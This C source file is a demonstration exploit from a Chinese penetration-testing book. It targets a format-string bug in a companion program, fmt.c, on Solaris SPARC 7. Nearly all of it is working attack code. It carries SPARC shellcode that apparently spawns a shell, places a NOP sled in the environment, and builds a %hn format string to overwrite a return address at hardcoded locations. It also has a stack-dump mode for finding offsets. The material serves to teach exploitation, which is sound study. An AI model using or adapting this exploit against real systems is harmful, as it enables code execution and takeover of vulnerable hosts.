/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对fmt.c的利用程序
*  演示平台：Solaris SPARC 7
*/

#include <stdio.h>
#include <strings.h>
#include <stdlib.h>

#define VUL         "./fmt"
#define RETLOC      0xff33824c
#define SHADDR      0xffbeff58
#define ALIGN       0
#define FLAG        106
#define SALIGN      0
#define NOP         0xac15a16e

char shellcode[]=
"\x2d\x0b\xd8\x9a"
"\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda"
"\xec\x3b\xbf\xf0"
"\x90\x03\xbf\xf0"
"\xd0\x23\xbf\xf8"
"\xc0\x23\xbf\xfc"
"\x92\x03\xbf\xf8"
"\x94\x1a\x80\x0a"
"\x82\x10\x20\x3b"
"\x91\xd0\x20\x08"
;

/* check if a long contains zero bytes */
int contains_zero(long value)
{
    return !((value & 0x00ffffff) &&
            (value & 0xff00ffff) &&
            (value & 0xffff00ff) &&
            (value & 0xffffff00));
}

/* prints a long to a string */
char* put_long(char* ptr, long value)
{
    *ptr++ = (char) (value >> 24) & 0xff;
    *ptr++ = (char) (value >> 16) & 0xff;
    *ptr++ = (char) (value >> 8) & 0xff;
    *ptr++ = (char) (value >> 0) & 0xff;

    return ptr;
}

void mkfmt(char *fmtstr, u_long retloc, u_long shaddr, int align, int flag, int dump)
{
    int i;
    unsigned int valh;
    unsigned int vall;

    if ( contains_zero(retloc) || contains_zero(retloc+2) ) {
        printf("retloc contain zero byte!\n");
        exit(1);
    }

    /* detailing the value */
    valh = (shaddr >> 16) & 0xffff; //top
    vall = shaddr & 0xffff;         //bottom

    for (i = 0; i < align; i++) {
        *fmtstr++ = 0x41;
    }

    if (!dump) {
        /* let's build */
        if (valh == vall) {
            fmtstr = put_long(fmtstr, retloc);
            fmtstr = put_long(fmtstr, retloc+2);

            for (i = 0; i < flag; i++) {
                memcpy(fmtstr, "%.8x", 4);
                fmtstr += 4;
            }

            sprintf(fmtstr,
                    "%%%uc"
                    "%%hn"
                    "%%hn"
                    ,
                    valh-flag*8-8
                   );
        }
        else if (valh < vall) {
            fmtstr = put_long(fmtstr, retloc);
            fmtstr = put_long(fmtstr, 0x43434343);
            fmtstr = put_long(fmtstr, retloc+2);

            for (i = 0; i < flag; i++) {
                memcpy(fmtstr, "%.8x", 4);
                fmtstr += 4;
            }

            sprintf(fmtstr,
                    "%%%uc"
                    "%%hn"
                    "%%%uc"
                    "%%hn"
                    ,
                    valh-flag*8-12,
                    vall-valh
                   );
        }
        else {
            fmtstr = put_long(fmtstr, retloc+2);
            fmtstr = put_long(fmtstr, 0x43434343);
            fmtstr = put_long(fmtstr, retloc);

            for (i = 0; i < flag; i++) {
                memcpy(fmtstr, "%.8x", 4);
                fmtstr += 4;
            }

            sprintf(fmtstr,
                    "%%%uc"
                    "%%hn"
                    "%%%uc"
                    "%%hn"
                    ,
                    vall-flag*8-12,
                    valh-vall
                   );
        }
    }
    else {
        // dump the stack memory

        memcpy(fmtstr, "BBBB", 4);
        fmtstr += 4;
        memcpy(fmtstr, "CCCC", 4);
        fmtstr += 4;
        flag += 2;
        for (i = 0; i < flag; i++) {
            memcpy(fmtstr, "%x", 2);
            fmtstr += 2;
        }
    }
}

int main(int argc, char *argv[])
{
    int     align  = ALIGN;
    int     flag   = FLAG;
    int     salign = SALIGN;
    int     dump   = 0;
    int     i;
    char    buf[256];
    char    shellcode_buf[1024];
    char    *ptr;
    char    *args[] = {VUL, buf, NULL};
    char    *env[2];

    if (argc > 1) align  = atoi(argv[1]);
    if (argc > 2) flag   = atoi(argv[2]);
    if (argc > 3) dump   = atoi(argv[3]);
    if (argc > 4) salign = atoi(argv[4]);

    bzero (buf, sizeof(buf));
    /* build format strings */
    mkfmt (buf, RETLOC, SHADDR, align, flag, dump);

    bzero(shellcode_buf, sizeof(shellcode_buf));
    ptr = shellcode_buf;

    for (i = 0; i < salign; i++) {
        *ptr++ = 0x41;
    }
    for (i = 0; i < 100; i++) {
        ptr = put_long(ptr, NOP);
    }
    strcat(shellcode_buf, shellcode);

    env[0] = shellcode_buf;
    env[1] = NULL;

    execve (args[0], args, env);
    return 0;
}
